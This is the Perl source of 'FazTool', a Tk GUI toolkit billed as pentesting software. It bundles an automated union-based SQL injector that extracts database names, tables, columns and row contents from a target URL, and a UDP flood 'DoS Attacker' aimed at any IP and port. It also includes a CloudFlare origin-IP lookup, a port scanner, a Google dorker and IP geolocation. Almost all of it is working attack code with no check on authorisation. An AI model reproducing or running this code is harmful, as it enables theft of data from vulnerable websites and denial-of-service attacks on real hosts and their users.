#!/usr/bin/perl -w

use warnings;
use Tk;
use Tk::NoteBook;
use Tk::LabFrame;
use Tk::Pane;
use Tk::DialogBox;
use Tk::ROText;
use Tk::PNG;
use Tk::JPEG;
use LWP::UserAgent;
use HTTP::Response;
use Socket;
use IO::Socket;
use JSON qw( decode_json encode_json );
use HTTP::Request::Common qw(POST);
use HTTP::Request::Common qw(GET);

our ($stdout, $stderr);
my ($opsp, $gdd, $gddd, $dos, $doss, $dosss, $dossss);

my ($bdork, $gdork, $in, @hasil);
our $a;
our $courier = [
	-family => 'Courier New',
	-size   => 10,
	-weight => 'bold',
];
my $fzr;
my ($zzzz, $zzz);
my $resFrame;
my ($pp, $p);

my $mw=Tk::MainWindow->new;
$mw->toplevel->iconbitmap('img/a.ico');

my $nb = $mw->NoteBook->pack (-fill => 'both', -expand => 1);

my $niz = $nb->add ('zr', -label => 'Welcome');
    my $help = $niz->Scrolled ('ROText',
			-scrollbars => 'e',
			-foreground => '#000000',
			-background => '#FFFFFF',
			-wrap       => 'word',
			-font       => [
				-family => 'Arial',
				-size   => 10,
			],
	)->pack (-fill => 'both', -expand => 1);
	$help->tagConfigure ('title',
			-foreground => '#FF0000',
			-font       => [
				-family => 'Courier New',
				-size   => 16,
				-weight => 'bold',
			],
		);
	$help->tagConfigure ('ver',
			-foreground => '#0000FF',
			-underline  => 1,
		);
	$help->tagConfigure ('header',
			-foreground => '#0000FF',
			-font       => [
				-family => 'Arial',
				-size   => 12,
				-weight => 'bold',
			],
		);
	$help->insert ('end',"FazTool",'title');
		$help->insert ('end',"\n\n");
		$help->insert ('end',"What is FazTool ?",'header');
		$help->insert ('end',"\n\n"
			. "FazTool is a pentesting and information gathering software coded in Perl GUI Based. FazTool offers 5 features that can be used for pentesting and information gathering. FazTool will be updated soon, there is more than 5 features will be offered. Visit https://github.com/Anon6372098/FazTool to check if there is an update or suggestion.");
		$help->insert ('end',"\n\n");
		$help->insert ('end',"What are the Features ?",'header');
		$help->insert ('end',"\n\nThere are 6 features for this beta version, they are SQL Injector, CloudFlare WAF Bypasser, Open Port Scanner, DoS Attacker, Google Dorker, and IP Checker.\n\n");
		$help->insert ('end',"What is the known Bug or Glitch ?",'header');
		$help->insert ('end',"\n\nWell, the FazTool will be likely not responding while doing your command, it doesn't mean not responding at all, but it is running subroutine/function if the button is pressed (just wait it). And also i've seen that while you're entering url for SQL Injector feature, you have to give a space after the url. Example : http://fazri.pro/yes.php?id=1<space>.\n\n");
		$help->insert ('end',"Version",'header');
		$help->insert ('end',"\n\nFazTool Beta Version 1.1.0.0",'ver');
		$help->Button(
    		-text    => "Exit",
    		-command => sub { exit;}, 
		)->pack( -side => 'bottom', -anchor => 'ne', -fill => 'x' );

my $sf = $nb->add ('mfaz', -label => 'SQL Injector');

$sf->Photo('imgl', '-format' => 'png', -file => 'img/b.png');
my $label=$sf->Label('-image' => 'imgl')->pack;

$sf->Label(-text => 'Enter the Url')->pack(-side=>'top');
$sf->Entry(-textvariable => \$url)->pack(-side=>'top');
$sf->Button(-text    => 'Continue',
             -command => \&af )->pack;
$sf->Button(-text => 'Exit',
			 -command => sub { exit; })->pack( -side => 'bottom', -anchor => 'ne', -fill => 'x' );

sub af {
if(Exists($tol)) {
	$rol->destroy();
	$ror->destroy();
	$ron->destroy();
	$tol->destroy();
}

if(Exists($pp)) {
	$pp->destroy();
	$p->destroy();
}

$pp = $sf->LabFrame (
			-label     => 'Results',
			-labelside => 'acrosstop',
		)->pack(-side => 'top',-fill => 'x');

$p = $pp->Scrolled('Text',
				-foreground => '#0000FF', 
				-background => '#FFFFFF',
				-scrollbars => 'e',
				-wrap       => 'word',
				-height     => 20,
				-font       => $courier,
			)->pack(-side => 'top',-fill => 'x');

$p->insert('end',"\nPlease wait, FazTool is running\n");

@url = split('',$url);
        $url[$#url] = '';
        $url = join('',@url);

        sub hexad {
	        @ar = split('',$_[0]);
	        $string = '';
	        for(my $rt = 0;$rt <= $#ar; $rt ++)
	        {
		        $num = $ar[$rt];
		        $num = 30 + $ar[$rt];
		        $string .= $num;
	        }
	        return $string;
        }

        $browser = LWP::UserAgent->new;
        $browser->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
        $nb->update;
        $response = $browser->get($url . "'");
		my $t = "\n$url'\n";
		$p->insert('end', $t);
		$nb->update;
        if($response->content =~ /<b>Warning<\/b>:  m/ || $response->content =~ /You have an error in your SQL/ || $response->content =~ /<b>Fatal error<\/b>:  m/)
        {
			my $ta = 'The URL Has SQL Injection Vulnerability . . .'."\n\n";
			$p->insert('end', $ta);
        } else {
			my $tb = 'The URL Doesn\'t Has SQL Injection Vulnerability . . . :('."\n\n";
			$p->insert('end', $tb);
            return;
        }
		$nb->update;

		for($i = 1;1;$i ++) {
	        my $tc = " + " . $url . "+order+by+" . $i . '--' . "\n";
			$p->insert('end', $tc);
			$nb->update;
	        $response = $browser->get($url . "+order+by+" . $i . '--');
	        if( $response->content =~ /<b>Warning<\/b>:  mysql/ || $response->content =~ /You have an error in your SQL/ || $response->content =~ /' in 'order clause'/ || $response->content =~ /<b>Fatal error<\/b>:  m/)
	        {
		        $i = $i - 1;
		        my $td = " -   :   Columns = " . $i . "\n\n";
				$p->insert('end', $td);
				$nb->update;
		        goto a;
	        }
        }

        a:
        $nurl = $url . '+and+1=2+union+select+';
        for($z = 1;$z <= $i;$z++) {
	        if($z == $i) {
	            $nurl .= '0x4841434b434f4c554d4e3a' . hexad($z);}
	        else{
	            $nurl .= '0x4841434b434f4c554d4e3a' . hexad($z) . ",";}
        }

        $nurl .= '--';
        my $te = $nurl."\n\n";
		$p->insert('end', $te);
		$nb->update;
        $response = $browser->get($nurl);
        $column = 0;
        for($z = 1;$z <= $i;$z++) {
	        if($response->content =~ /HACKCOLUMN:$z/) {
                    my $tf = "Column $z is Injectable !\n";
					$p->insert('end', $tf);
					$column = $z;
					$nb->update;
                } else {
                    my $tg = "Column $z isn't Injectable !\n";
					$p->insert('end', $tg);
					$nb->update;
                }
        }

        if($column == 0) {
            my $th = "\nInjectable Column Not Found ! :(";
			$p->insert('end', $th);
			$nb->update;
			return;
        } else {
            my $ti = "\nThe Chosen Column for SQLi is " . $column . "\n\n";
			$p->insert('end', $ti);
			$nb->update;
        }

		sub command {
			$nb->update;
	        $nurl = $url . '+and+1=2+union+select+';
	        for($z = 1;$z <= $i;$z++)
	        {$nb->update;
		        if($z == $column)
		        {
			        if($z == $i) {
			        $nurl .= 'group_concat(0x4841434b434f4c554d4e3a,' . $_[0] . ',0x4841434b434f4c554d4e3a)';}
			        else{
			        $nurl .= 'group_concat(0x4841434b434f4c554d4e3a,' . $_[0] . ',0x4841434b434f4c554d4e3a)' . ",";}
		        }
		        else
		        {
			        if($z == $i) {
			            $nurl .= $z;
                    } else {
			            $nurl .= $z . ",";
                    }
		        }
				$nb->update;
	        }
	        $nurl .= '+' . $_[1] . '--';
	        $response = $browser->get($nurl);
	        @datastring = split('HACKCOLUMN:',$response->content);
	        return $datastring = $datastring[1];
			$nb->update;
        }

        my $tj = "\n=============================================\n\n";
		$p->insert('end', $tj);
		$nb->update;
        @server = split('::',command('DATABASE(),0x3a3a,VERSION(),0x3a3a,USER(),0x3a3a',''));
        my $tk = "  Current Database Name : " . $server[0] . "\n  Database Version : " . $server[1] . "\n  Username / Host : " . $server[2] . "\n\n";
		$p->insert('end', $tk);
		$nb->update;
        $database = $server[0];
        EXIT:
        $nb->update;
        while(1) {
	        my $tl = "Injected Site on $database\n\n\t+----------------------+\n\t|       Database       |\n\t+----------------------+\n";
			$p->insert('end', $tl);
			$nb->update;
	        command('schema_name','from+information_schema.schemata');
	        @datastring[0] = '';
	        @datastring[$#datastring] = '';
	        @databases = ();
	        for($x = 1;$x < $#datastring;$x += 2)
	        {
			    $nb->update;
		        $numberTMP = ($x - 1)/2;
		        my $tx = "\t|  [" . $numberTMP . "] " . $datastring[$x] . "\n";
				$p->insert('end', $tx);
				$nb->update;
		        push(@databases,$datastring[$x]);
				$nb->update;
	        }last;}
			$nb->update;
	        $tom = $sf->Label(-text => 'Enter Database ID')->pack(-side=>'top');
			$ton = $sf->Entry(-textvariable => \$db)->pack(-side=>'top');
			$tol = $sf->Button(-text    => 'Next',
             -command => sub {while(1){
				 
			$db = $databases[$db];

			   sub ascii_to_hex {
            my $s = shift;
            return unpack("H*", $s);
            }
	        
	        my $tn = "\n\n\t+----------------------+\n\t|      Tables Data     |\n\t+----------------------+\n";
			$p->insert('end', $tn);
			$nb->update;
	        command('table_name','from+information_schema.tables+where+TABLE_SCHEMA=0x' . ascii_to_hex($db));
	        @datastring[0] = '';
	        @datastring[$#datastring] = '';
	        @databases = ();
	        for($x = 1;$x < $#datastring;$x += 2)
	        {
				$nb->update;
		        my $numberTMP = ($x - 1)/2;
		        my $ty = "\t|  [" . $numberTMP . "] " . $datastring[$x] . "\n";
				$p->insert('end', $ty);
				$nb->update;
		        push(@databases,$datastring[$x]);
				$nb->update;
	        }last;}
			if(Exists($tom)) {
				$tom->destroy;
				$ton->destroy;
			}
			$nb->update;
	        $rol = $sf->Label(-text => 'Choose Table ID')->pack;
			$ror = $sf->Entry(-textvariable => \$table)->pack;
			$ron = $sf->Button(-text    => 'Execute',
             -command => sub {while(1) {

	        $table = $databases[$table];
	
	        my $tp = "\n\n\t+----------------------+\n\t|      Columns Data    |\n\t+----------------------+\n";
			$p->insert('end', $tp);
			$nb->update;
	        command('column_name','from+information_schema.columns+where+table_name=0x' . ascii_to_hex($table));
	        @datastring[0] = '';
	        @datastring[$#datastring] = '';
	        @databases = ();
	        for($x = 1;$x < $#datastring;$x += 2)
	        {
				$nb->update;
		        $numberTMP = ($x - 1)/2;
		        my $tz = "\t|  [" . $numberTMP . "] " . $datastring[$x] . "\n";
				$p->insert('end', $tz);
				$nb->update;
		        push(@databases,$datastring[$x]);
				$nb->update;
	        }
		        my $tq = "\n=============================================\n\n";
				$p->insert('end', $tq);
				$nb->update;
		        my $ts = join ',' , @databases;
				$p->insert('end', $ts);
				$nb->update;
		        my $tu = "\n\n\n";
				$p->insert('end', $tu);
				$nb->update;
				
		        $STR = join ',0x3a3a,' , @databases;
		        command($STR,"from+$db.$table");
		        @datastring[0] = '';
		        @datastring[$#datastring] = '';
		        @databases = ();
				$nb->update;
		        for($x = 1;$x < $#datastring;$x += 2)
		        {	
					$nb->update;
			        @SPLIT = split('::',$datastring[$x]);
			        $SPLIT = join  ',' ,@SPLIT;
			        my $tv = $SPLIT . "\n\n";
					$p->insert('end', $tv);
					$nb->update;
		        }last;}})->pack;$nb->update;
	        })->pack;$nb->update;}

my $zrz = $nb->add ('fazrin', -label => 'CloudFlare WAF Bypasser');

$zrz->Photo('imgz', '-format' => 'png', -file => 'img/h.png');
my $imgl=$zrz->Label('-image' => 'imgz')->pack;
my $cfl;
$zrz->Label(-text => 'Enter the Website (no protocol)')->pack(-side=>'top');
$zrz->Entry(-textvariable => \$cfl)->pack(-side=>'top');
$zrz->Button(-text    => 'Continue',
             -command => \&faz )->pack;
$zrz->Button(-text => 'Exit',
			 -command => sub { exit; })->pack( -side => 'bottom', -anchor => 'ne', -fill => 'x' );

sub faz {
if(Exists($pp)) {
	$pp->destroy();
	$p->destroy();
}

$pp = $zrz->LabFrame (
			-label     => 'Results',
			-labelside => 'acrosstop',
		)->pack(-side => 'top',-fill => 'x');

$p = $pp->Scrolled('Text',
				-foreground => '#0000FF', 
				-background => '#FFFFFF',
				-scrollbars => 'e',
				-wrap       => 'word',
				-height     => 20,
				-font       => $courier,
			)->pack(-side => 'top',-fill => 'x');

$p->insert('end',"\nPlease wait, FazTool is running\n");
$nb->update;

my $xyz = LWP::UserAgent->new;
        $xyz = LWP::UserAgent->new(keep_alive => 1);
        $xyz->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

        my $an = (gethostbyname($cfl))[4];
        my ($w,$x,$y,$z) = unpack('C4',$an);
        my $cf = "$w.$x.$y.$z";
        if($cf =~ /[0-9]/) {
            $p->insert('end',"\n[?] Possible CloudFlare WAF Protected IP : $cf\n");
			$nb->update;
        }

        $p->insert('end',"\n");
        my $str = "http://www.crimeflare.org:82/cgi-bin/cfsearch.cgi";
        my $strt = POST $str, [cfS => $cfl];
        my $strts = $xyz->request($strt);
        my $mfn = $strts->content;

        if($mfn=~m/">(.*?)<\/a>&nbsp/g) {
            $p->insert('end',"+=+=+<-->-Bypassed CloudFlare WAF Information-<-->+=+=+\n");
            $p->insert('end',"| [A] Original IP : $1\n");
            $an = $1;
			$nb->update;
        } elsif($mfn=~m/not CloudFlare-user nameservers/g) {
            $p->insert('end',"[-] These aren't CloudFlare-user Nameservers !\n");
            $p->insert('end',"[-] This website isn't using CloudFlare Protection\n");
			$nb->update;
        } elsif($mfn=~m/No direct-connect IP address was found for this domain/g) {
            $p->insert('end',"[-] There is no direct Connect IP Address was found for this Website/Domain\n");
			$nb->update;
        } else {
            $p->insert('end',"[!] There is a problem occured . . .\n\n");
            $p->insert('end',"[!] Check if the website is up/valid\n");
            $p->insert('end',"[!] Check your connection\n");
            $p->insert('end',"[!] Make sure you input the website without http/https\n\n");
			$nb->update;
        }

        my $h = "http://ipinfo.io/$an/json";
        my $i = $xyz->get($h);
        my $j = $i->content;

        if($j=~m/hostname": "(.*?)"/g) {
            $p->insert('end',"| [+] Hostname : $1\n");
			$nb->update;
        } if($j=~m/city": "(.*?)"/g) {
            $p->insert('end',"| [+] City : $1 [Accuracy is relative]\n");
			$nb->update;
        } if($j=~m/region": "(.*?)"/g) {
            $p->insert('end',"| [+] Region : $1 [Accuracy is relative]\n");
			$nb->update;
        } if($j=~m/country": "(.*?)"/g) {
            $p->insert('end',"| [+] Country : $1 [Accuracy is relative]\n");
			$nb->update;
        } if($j=~m/loc": "(.*?)"/g) { 
            $p->insert('end',"| [+] Location : $1 [Accuracy is relative]\n");
			$nb->update;
        } if($j=~m/org": "(.*?)"/g) {
            $p->insert('end',"| [+] Organization : $1\n");
            $p->insert('end',"+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n");
            $nb->update;
		}
}

my $op = $nb->add ('mfa', -label => 'Open Port Scanner');

$op->Photo('imgt', '-format' => 'png', -file => 'img/c.png');
my $lang=$op->Label('-image' => 'imgt')->pack;

$op->Label(-text => 'Enter the Website (no protocol)')->pack(-side=>'top');
$op->Entry(-textvariable => \$opsp)->pack(-side=>'top');
$op->Button(-text    => 'Continue',
             -command => \&ops )->pack;
$op->Button(-text => 'Exit',
			 -command => sub { exit; })->pack( -side => 'bottom', -anchor => 'ne', -fill => 'x' );

sub ops {
if(Exists($pp)) {
	$pp->destroy();
	$p->destroy();
}

$pp = $op->LabFrame (
			-label     => 'Results',
			-labelside => 'acrosstop',
		)->pack(-fill => 'x');

$p = $pp->Scrolled('Text',
				-foreground => '#0000FF', 
				-background => '#FFFFFF',
				-scrollbars => 'e',
				-wrap       => 'word',
				-height     => 20,
				-font       => $courier,
			)->pack (-fill => 'x');

$p->insert('end',"\nPlease wait, FazTool is scanning\n\n");
$nb->update;

sub op {my @sl = ('FTP (1)', 'FTP (2)', 'SSH', 'TelNet', 'SMTP', 'DNS', 'HTTP', 'HTTP-ALT (1)', 'POP3', 'NetBios', 'LDAP', 'HTTPS (SSL)', 'SQL Server', 'CPanel', 'MySQL', 'HTTP-ALT (2)');
        my @ls = ('20', '21', '22', '23', '25', '53', '80', '81', '110', '139', '389', '443', '1433', '2082', '3306', '8080');

        $| = 1;
 
        foreach $b(@ls) {
			$nb->update;
            my $port = shift @sl;
     
            my $ar = IO::Socket::INET->new(PeerAddr => $opsp , PeerPort => $b , Proto => 'tcp' , Timeout => 1);
     
            if( $ar ) {
                printf("\r[+] Port $b ($port) is opened\n");
            } else {
                printf("\r[-] Port $b ($port) is closed\n");
            }
        }
        printf("\nFinished Scanning for Open Port Website $opsp\n");}

sub opp {local *STDOUT;
        my $result;
        open STDOUT, '>', \$result;
        op();
        return $result;}

my $val = opp();

$p->insert('end', $val);
}

##########################################################################################################################################

$bdork = $nb->add('mf', -label => 'DoS Attacker');

$bdork->Photo('img4', '-format' => 'png', -file => 'img/d.png');
my $bp = $bdork->Label('-image' => 'img4')->pack;

$bdork->Label(-text => 'IP')->place(-x => 310, -y => 130);
$bdork->Entry(-relief => 'groove',-textvariable => \$dos)->place(-x => 260,-y => 150);
$bdork->Label(-text => 'Port')->place(-x => 785, -y => 130);
$bdork->Entry(-relief => 'groove',-textvariable => \$doss)->place(-x => 740, -y => 150);
$bdork->Label(-text => 'Size')->place(-x => 545, -y => 130);
$bdork->Entry(-relief => 'groove',-textvariable => \$dosss)->place(-x => 500,-y => 150);
$bdork->Label(-text => 'Time')->place(-x => 1025, -y => 130);
$bdork->Entry(-relief => 'groove',-textvariable => \$dossss)->place(-x => 980, -y => 150);
$bdork->Button(-text => 'Continue',
			   -relief => 'groove',
			   -command => \&bv)->place(-x => 657.5, -y => 150);
$bdork->Button(-text => 'Exit',
			   -relief => 'groove',
			   -command => sub { exit; })->pack( -side => 'bottom', -anchor => 'ne', -fill => 'x' );

sub bv {
if(Exists($pp)) {
	$pp->destroy();
	$p->destroy();
}

$pp = $bdork->LabFrame (
			-label     => 'Results',
			-labelside => 'acrosstop',
		)->pack(-side => 'bottom',-fill => 'x');

$p = $pp->Scrolled('Text',
				-foreground => '#0000FF', 
				-background => '#FFFFFF',
				-scrollbars => 'e',
				-wrap       => 'word',
				-height     => 27,
				-font       => $courier,
				-width      => 50,
			)->pack(-side => 'bottom',-fill => 'x');

$p->insert('end',"\n[DoS Started]\n\n\t\t|IP = $dos| |Port = $doss| |Packet = $dosss| |Time = $dossss|\n\n");

sub bvv {
        my ($faz,$ri,$niz,$ar);
        $faz = inet_aton("$dos") || die("Can't connect : $!");
        $ri = time() + ($dossss ? $dossss : 1000000);

        socket(FLOOD, PF_INET, SOCK_DGRAM, 17);
        
        printf("Press 'Continue' to Stop\n") unless $dossss;
        for (;time() <= $ri;) {$nb->update;
            $niz = $dosss ? $dosss : int(rand(1500-64)+64) ;
            $ar = $doss ? $doss : int(rand(65500))+1;
 
            send(FLOOD, pack("a$ar","flood"), 0, pack_sockaddr_in($ar, $faz));}
		printf("[DoS Finished]\n");
        } 

sub bvg {local *STDOUT;
        my $result;
        open STDOUT, '>', \$result;
        bvv();
        return $result;}

my $val = bvg();

$p->insert('end', $val);
}

sub gv {

if(Exists($pp)) {
	$pp->destroy();
	$p->destroy();
	return;
}

$pp = $gdork->LabFrame (
			-label     => 'Results',
			-labelside => 'acrosstop',
		)->pack(-side => 'bottom',-fill => 'x');

$p = $pp->Scrolled('Text',
				-foreground => '#0000FF', 
				-background => '#FFFFFF',
				-scrollbars => 'e',
				-wrap       => 'word',
				-height     => 27,
				-font       => $courier,
				-width      => 50,
			)->pack(-side => 'bottom',-fill => 'x');

$p->insert('end',"\nPlease wait, FazTool is running\n\n");
$nb->update;

sub gvv {my $pen = LWP::UserAgent->new;
            $pen->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
	        $pen->timeout(15);

		    my $z = "http://www.google.com/search?filter=1&num=$gddd&start=0&q=$gdd";
		    my $zy = $pen->get($z);
		    my $zyz = $zy->content;

		    while($zyz=~m/<a href=\"\/url\?q=(.*?)&amp;/g) {
				$nb->update;
                sub ud {
                    my $fzrud = shift;
                    $fzrud =~ tr/\+/ /;
                    $fzrud =~ s/\%([A-Fa-f0-9]{2})/pack('C', hex($1))/eg;
                    return $fzrud;
                }

			    if($zyz!~/^https/) {
				    $in = ud($1);
			    } elsif($zyz=~/^https/) {
					$in = ud($1);
				}

				if($in!~/google/) {
					if(!grep(/$in/,@hasil)) {
						$nb->update;
					    $p->insert('end',"$in\n");
					}
				}
            }}
gvv();
}

$gdork = $nb->add('m', -label => 'Google Dorker');

$gdork->Photo('img3', '-format' => 'png', -file => 'img/e.png');
my $gp = $gdork->Label('-image' => 'img3')->pack;

$gdork->Label(-text => 'Dork')->place(-x => 550, -y => 130);
$gdork->Entry(-relief => 'groove',-textvariable => \$gdd)->place(-x => 500,-y => 150);
$gdork->Label(-text => 'Amount of Result')->place(-x => 760, -y => 130);
$gdork->Entry(-relief => 'groove',-textvariable => \$gddd)->place(-x => 740, -y => 150);
$gdork->Button(-text => 'Continue',
			   -relief => 'groove',
			   -command => \&gv)->place(-x => 657.5, -y => 150);
$gdork->Button(-text => 'Exit',
			   -relief => 'groove',
			   -command => sub { exit; })->pack( -side => 'bottom', -anchor => 'ne', -fill => 'x' );

my $calc = $nb->add ('faz', -label => 'IP Checker');

$calc->Photo('img1', '-format' => 'png', -file => 'img/f.png');
my $var=$calc->Label('-image' => 'img1')->pack;

$calc->Label(-text => 'Enter the IP Address')->pack(-side=>'top');
$calc->Entry(-textvariable => \$fzr)->pack(-side=>'top');
$calc->Button(-text    => 'Continue',
             -command => \&ab )->pack;
$calc->Button(-text => 'Exit',
			 -command => sub { exit; })->pack( -side => 'bottom', -anchor => 'ne', -fill => 'x' );

sub ab {

if(Exists($pp)) {
	$pp->destroy();
	$p->destroy();
}

$pp = $calc->LabFrame (
			-label     => 'Results',
			-labelside => 'acrosstop',
		)->pack(-fill => 'x');

$p = $pp->Scrolled('Text',
				-foreground => '#0000FF', 
				-background => '#FFFFFF',
				-scrollbars => 'e',
				-wrap       => 'word',
				-height     => 20,
				-font       => $courier,
			)->pack (-fill => 'x');

$p->insert('end',"\nPlease wait, FazTool is running\n\n");
$nb->update;

sub to {my$x=LWP::UserAgent->new;$x=LWP::UserAgent->new(keep_alive => 1);$x->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");my$b="https://ipapi.co/$fzr/xml";my$c=$x->get("$b");my$d=$c->content;my$e=$c->code;if($e=~/200/ || $c->is_success){if($d=~m/<ip>(.*?)<\/ip>/g){printf("\nIP : $1");}if($d=~m/<city>(.*?)<\/city>/g){printf("\nCity : $1");}if($d=~m/<region>(.*?)<\/region>/g){printf("\nRegion : $1");}if($d=~m/<region_code>(.*?)<\/region_code>/g){printf("\nRegion Code : $1");}if($d=~m/<country>(.*?)<\/country>/g){printf("\nCountry Code : $1");}if($d=~m/<country_name>(.*?)<\/country_name>/g){printf("\nCountry : $1");}if($d=~m/<continent_code>(.*?)<\/continent_code>/g){printf("\nContinent Code : $1");}if($d=~m/<in_eu>(.*?)<\/in_eu>/g){printf("\nIn Europe : $1");}if($d=~m/<postal>(.*?)<\/postal>/g){printf("\nPostal Code : $1");}if($d=~m/<latitude>(.*?)<\/latitude>/g){printf("\nLatitude : $1");}if($d=~m/<longitude>(.*?)<\/longitude/g){printf("\nLongitude : $1");}if($d=~m/<timezone>(.*?)<\/timezone>/g){printf("\nTimezone : $1");}if($d=~m/<utc_offset>(.*?)<\/utc_offset>/g){printf("\nUTC Offset : $1");}if($d=~m/<country_calling_code>(.*?)<\/country_calling_code>/){printf("\nCountry Calling Code : $1");}if($d=~m/<currency>(.*?)<\/currency>/){printf("\nCurrency : $1");}if($d=~m/<languages>(.*?)<\/languages>/g){printf("\nLanguages Code : $1");}if($d=~m/<asn>(.*?)<\/asn>/g){printf("\nASN : $1");}if($d=~m/<org>(.*?)<\/org>/g){printf("\nOrganization : $1");}}elsif($c->is_client_error){printf("\n\nThe api is error, please try again later\n");}elsif($c->is_server_error){printf("\n\nInternal problem, please check your internet connection and try again");}elsif($c->is_redirect){printf("\n\nThe api is redirected, please try again or contact me at 'About' page");}else{printf("\n\nThe error's unknown, please try again later, check your internet connection, or contact me at 'About' page");}}

sub ca {local *STDOUT;
        my $result;
        open STDOUT, '>', \$result;
        to();
        return $result;}

my $val = ca();

$p->insert('end', $val);
}

my $nizar = $nb->add ('niz', -label => 'About');
    my $helpBox = $nizar->Scrolled ('ROText',
			-scrollbars => 'e',
			-foreground => '#000000',
			-background => '#FFFFFF',
			-wrap       => 'word',
			-font       => [
				-family => 'Arial',
				-size   => 10,
			],
	)->pack (-fill => 'both', -expand => 1);
	$helpBox->tagConfigure ('title',
			-foreground => '#FF0000',
			-font       => [
				-family => 'Courier New',
				-size   => 16,
				-weight => 'bold',
			],
		);
	$helpBox->tagConfigure ('email',
			-foreground => '#0000FF',
			-underline  => 1,
		);
	$helpBox->tagConfigure ('header',
			-foreground => '#0000FF',
			-font       => [
				-family => 'Arial',
				-size   => 12,
				-weight => 'bold',
			],
		);
		$helpBox->Photo('img2', -file => 'img/g.jpg');
        my $xn=$helpBox->Label('-image' => 'img2')->pack( -side => 'right', -anchor => 'ne', -fill => 'x');
	$helpBox->insert ('end',"FazTool",'title');
		$helpBox->insert ('end',"\n\n");
		$helpBox->insert ('end',"About",'header');
		$helpBox->insert ('end',"\n\n"
			. "FazTool is a pentesting and information gathering software coded in Perl GUI Based. Contact me at email below for further information.");
		$helpBox->insert ('end',"\n\n");
		$helpBox->insert ('end',"Coded by M.Fazri Nizar\n");
		$helpBox->insert ('end',"anon6372098.id\@gmail.com",'email');
		$helpBox->Button(
    		-text    => "My GitHub",
    		-command => sub { 
				my $url = "https://github.com/Anon6372098";
				my $com = "start $url";
				exec($com);  
			}, 
		)->pack( -side => 'bottom', -anchor => 'ne', -fill => 'x' );

MainLoop;